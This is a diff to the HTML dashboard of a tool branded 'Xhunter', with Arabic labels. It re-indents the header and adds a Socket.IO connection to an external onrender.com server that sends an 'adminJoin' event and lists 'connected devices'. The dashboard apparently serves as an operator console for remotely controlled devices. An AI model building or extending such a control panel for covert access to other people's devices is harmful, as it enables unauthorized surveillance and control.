@@ -775,20 +775,42 @@
 <body>
 <div class="container">
     <header>
-        <div class="logo">
-            <h1>نظام <span>Xhunter المتطور</span></h1>
+    <div class="logo">
+        <h1>نظام <span>Xhunter المتطور</span></h1>
+    </div>
+    <div class="user-info">
+        <div class="user-avatar">
+            <i class="fas fa-user-shield"></i>
         </div>
-        <div class="user-info">
-            <div class="user-avatar">
-                <i class="fas fa-user-shield"></i>
-            </div>
-            <div>مدير النظام</div>
-            <div class="connection-status connecting" id="connectionStatus">
-                <i class="fas fa-sync-alt fa-spin"></i> جاري الاتصال...
-            </div>
+        <div>مدير النظام</div>
+        <div class="connection-status connecting" id="connectionStatus">
+            <i class="fas fa-sync-alt fa-spin"></i> جاري الاتصال...
         </div>
-    </header>
-    
+    </div>
+</header>
+
+<!-- سكربت Socket.IO -->
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const socket = io('https://projectd-vu1m.onrender.com', { 
+  transports: ['websocket'], 
+  reconnection: true 
+});
+
+// انضمام الأدمن
+socket.emit('adminJoin');
+
+// تحديث حالة الاتصال
+socket.on('connect', ()=>{
+  document.getElementById('connectionStatus').innerHTML = 
+    '<i class="fas fa-check-circle" style="color:lime"></i> متصل';
+});
+
+socket.on('disconnect', ()=>{
+  document.getElementById('connectionStatus').innerHTML = 
+    '<i class="fas fa-times-circle" style="color:red"></i> غير متصل';
+});
+</script> 
     <aside class="sidebar">
         <ul class="sidebar-menu">
             <li><a href="#" class="active" data-tab="devices"><i class="fas fa-microchip"></i> الأجهزة المتصلة</a></li>
